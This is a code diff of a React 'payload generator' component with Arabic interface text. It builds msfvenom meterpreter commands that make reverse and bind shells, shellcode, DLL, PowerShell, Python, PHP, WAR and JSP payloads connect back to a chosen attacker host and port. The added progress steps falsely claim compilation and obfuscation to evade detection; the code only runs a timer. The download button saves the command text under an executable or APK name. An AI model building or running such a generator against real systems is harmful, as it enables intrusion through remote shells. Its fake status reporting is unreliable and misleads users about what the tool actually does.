@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { motion } from 'motion/react';
-import { Zap, Terminal, Shield, Download, Cpu, Code, Globe, Server, Copy, Check } from 'lucide-react';
+import { Zap, Terminal, Shield, Download, Cpu, Code, Globe, Server, Copy, Check, FileCode } from 'lucide-react';
 
 interface PayloadGeneratorProps {
   onAction?: (action: string) => void;
@@ -13,18 +13,84 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
   const [lhost, setLhost] = useState('192.168.1.10');
   const [lport, setLport] = useState('4444');
   const [isGenerating, setIsGenerating] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [statusMessage, setStatusMessage] = useState('');
   const [generatedPayload, setGeneratedPayload] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
+  const [errors, setErrors] = useState<{ lhost?: string; lport?: string }>({});
+
+  const validateInputs = () => {
+    const newErrors: { lhost?: string; lport?: string } = {};
+    
+    // Validate LHOST (IP or Hostname)
+    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+    const hostRegex = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/;
+    if (!lhost) {
+      newErrors.lhost = 'LHOST مطلوب';
+    } else if (!ipRegex.test(lhost) && !hostRegex.test(lhost)) {
+      newErrors.lhost = 'عنوان IP أو Hostname غير صالح';
+    }
+
+    // Validate LPORT (1-65535)
+    const portNum = parseInt(lport);
+    if (!lport) {
+      newErrors.lport = 'LPORT مطلوب';
+    } else if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
+      newErrors.lport = 'المنفذ يجب أن يكون بين 1 و 65535';
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
 
   const handleGenerate = () => {
+    if (!validateInputs()) {
+      setStatusMessage('خطأ في الإدخال: يرجى التحقق من LHOST و LPORT');
+      return;
+    }
+
     setIsGenerating(true);
     setGeneratedPayload(null);
+    setProgress(0);
+    setStatusMessage('بدء عملية التوليد...');
     
-    setTimeout(() => {
-      const payload = `msfvenom -p ${os}/${arch}/meterpreter/${payloadType} LHOST=${lhost} LPORT=${lport} -f elf > payload.elf`;
-      setGeneratedPayload(payload);
-      setIsGenerating(false);
-    }, 2000);
+    const steps = [
+      { p: 15, m: 'تحليل الإعدادات المحددة...' },
+      { p: 30, m: 'تجهيز بيئة التجميع (Compilation Environment)...' },
+      { p: 50, m: 'توليد الكود المصدري للحمولة...' },
+      { p: 75, m: 'تشفير الحمولة وتجنب الكشف (Obfuscation)...' },
+      { p: 90, m: 'التحقق النهائي من سلامة الكود...' },
+      { p: 100, m: 'تم التوليد بنجاح!' }
+    ];
+
+    let currentStep = 0;
+    const interval = setInterval(() => {
+      if (currentStep < steps.length) {
+        setProgress(steps[currentStep].p);
+        setStatusMessage(steps[currentStep].m);
+        currentStep++;
+      } else {
+        clearInterval(interval);
+        
+        let format = 'elf';
+        if (os === 'windows') format = 'exe';
+        if (os === 'android') format = 'apk';
+        
+        // Override format based on payload type
+        if (payloadType === 'shellcode') format = 'raw';
+        if (payloadType === 'dll') format = 'dll';
+        if (payloadType === 'powershell_script') format = 'ps1';
+        if (payloadType === 'python_reverse') format = 'py';
+        if (payloadType === 'php_reverse') format = 'php';
+
+        const payloadPath = `${os}/${arch}/meterpreter/${payloadType.includes('reverse') ? payloadType : 'reverse_tcp'}`;
+        const payload = `msfvenom -p ${payloadPath} LHOST=${lhost} LPORT=${lport} -f ${format} -o payload.${format}`;
+        
+        setGeneratedPayload(payload);
+        setIsGenerating(false);
+        setStatusMessage(`تم توليد حمولة ${payloadType} بنجاح لنظام ${os}`);
+      }
+    }, 500);
   };
 
   const handleCopy = () => {
@@ -42,6 +108,20 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
       setCopied(true);
       setTimeout(() => setCopied(false), 2000);
     });
+  };
+
+  const handleDownload = () => {
+    if (!generatedPayload) return;
+    const ext = os === 'windows' ? 'exe' : os === 'android' ? 'apk' : 'elf';
+    const blob = new Blob([generatedPayload], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `payload.${ext}`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
   };
 
   return (
@@ -93,6 +173,27 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
                   <option value="mipsle">MIPS</option>
                 </select>
               </div>
+
+              <div className="space-y-1.5">
+                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">نوع الحمولة (Payload Type)</label>
+                <select 
+                  value={payloadType}
+                  onChange={(e) => setPayloadType(e.target.value)}
+                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
+                >
+                  <option value="reverse_tcp">Reverse TCP</option>
+                  <option value="bind_tcp">Bind TCP</option>
+                  <option value="reverse_https">Reverse HTTPS</option>
+                  <option value="shellcode">Shellcode (Raw)</option>
+                  <option value="dll">DLL Payload</option>
+                  <option value="exe">EXE Payload</option>
+                  <option value="powershell_script">PowerShell Script</option>
+                  <option value="python_reverse">Python Reverse Shell</option>
+                  <option value="php_reverse">PHP Reverse Shell</option>
+                  <option value="war">WAR Payload (Java)</option>
+                  <option value="jsp">JSP Payload</option>
+                </select>
+              </div>
             </div>
           </div>
 
@@ -108,9 +209,13 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
                 <input 
                   type="text"
                   value={lhost}
-                  onChange={(e) => setLhost(e.target.value)}
-                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors"
+                  onChange={(e) => {
+                    setLhost(e.target.value);
+                    if (errors.lhost) setErrors({ ...errors, lhost: undefined });
+                  }}
+                  className={`w-full bg-[var(--bg-input)] border ${errors.lhost ? 'border-[var(--accent-red)]' : 'border-[var(--border-color)]'} rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors`}
                 />
+                {errors.lhost && <p className="text-[9px] text-[var(--accent-red)] font-bold">{errors.lhost}</p>}
               </div>
 
               <div className="space-y-1.5">
@@ -118,9 +223,13 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
                 <input 
                   type="text"
                   value={lport}
-                  onChange={(e) => setLport(e.target.value)}
-                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors"
+                  onChange={(e) => {
+                    setLport(e.target.value);
+                    if (errors.lport) setErrors({ ...errors, lport: undefined });
+                  }}
+                  className={`w-full bg-[var(--bg-input)] border ${errors.lport ? 'border-[var(--accent-red)]' : 'border-[var(--border-color)]'} rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-colors`}
                 />
+                {errors.lport && <p className="text-[9px] text-[var(--accent-red)] font-bold">{errors.lport}</p>}
               </div>
             </div>
           </div>
@@ -142,21 +251,52 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
               <span className="text-xs font-black uppercase tracking-wider">كود الحمولة المولد (Generated Output)</span>
             </div>
             {generatedPayload && (
-              <button 
-                onClick={handleCopy}
-                className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-cyan)] hover:border-[var(--accent-cyan)] transition-all"
-              >
-                {copied ? <Check size={12} className="text-[var(--accent-green)]" /> : <Copy size={12} />}
-                {copied ? 'تم النسخ' : 'نسخ الكل'}
-              </button>
+              <div className="flex items-center gap-2">
+                <button 
+                  onClick={handleDownload}
+                  className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-orange)] hover:border-[var(--accent-orange)] transition-all"
+                >
+                  <Download size={12} />
+                  تحميل (Download)
+                </button>
+                <button 
+                  onClick={handleCopy}
+                  className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-cyan)] hover:border-[var(--accent-cyan)] transition-all"
+                >
+                  {copied ? <Check size={12} className="text-[var(--accent-green)]" /> : <Copy size={12} />}
+                  {copied ? 'تم النسخ' : 'نسخ الكل'}
+                </button>
+              </div>
             )}
           </div>
           
           <div className="flex-1 p-6 font-mono text-sm overflow-y-auto custom-scrollbar relative">
             {isGenerating ? (
-              <div className="absolute inset-0 flex flex-col items-center justify-center space-y-4 bg-[rgba(10,14,23,0.8)] backdrop-blur-sm z-10">
-                <div className="w-12 h-12 border-4 border-[var(--accent-orange)] border-t-transparent rounded-full animate-spin" />
-                <p className="text-xs font-black uppercase tracking-widest text-[var(--accent-orange)]">Compiling Payload...</p>
+              <div className="absolute inset-0 flex flex-col items-center justify-center space-y-6 bg-[rgba(10,14,23,0.85)] backdrop-blur-md z-10 p-8">
+                <div className="relative w-24 h-24">
+                  <div className="absolute inset-0 border-4 border-[rgba(255,136,0,0.1)] rounded-full" />
+                  <motion.div 
+                    className="absolute inset-0 border-4 border-[var(--accent-orange)] border-t-transparent rounded-full"
+                    animate={{ rotate: 360 }}
+                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
+                  />
+                  <div className="absolute inset-0 flex items-center justify-center text-xs font-black text-[var(--accent-orange)]">
+                    {progress}%
+                  </div>
+                </div>
+                
+                <div className="w-full max-w-xs space-y-2">
+                  <div className="h-1.5 w-full bg-[rgba(255,255,255,0.05)] rounded-full overflow-hidden">
+                    <motion.div 
+                      className="h-full bg-[var(--accent-orange)]"
+                      initial={{ width: 0 }}
+                      animate={{ width: `${progress}%` }}
+                    />
+                  </div>
+                  <p className="text-[10px] font-black uppercase tracking-widest text-[var(--accent-orange)] text-center animate-pulse">
+                    {statusMessage}
+                  </p>
+                </div>
               </div>
             ) : null}
 
@@ -166,6 +306,12 @@ export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) 
                 animate={{ opacity: 1 }}
                 className="space-y-6"
               >
+                {statusMessage && (
+                  <div className="flex items-center gap-2 px-3 py-2 bg-[rgba(0,255,157,0.1)] border border-[rgba(0,255,157,0.2)] rounded text-[var(--accent-green)] text-[10px] font-bold uppercase tracking-wider animate-in fade-in slide-in-from-top-2">
+                    <Check size={12} />
+                    {statusMessage}
+                  </div>
+                )}
                 <div className="p-4 rounded bg-[var(--bg-tertiary)] border border-[var(--border-color)] text-[var(--accent-green)] break-all">
                   {generatedPayload}
                 </div>
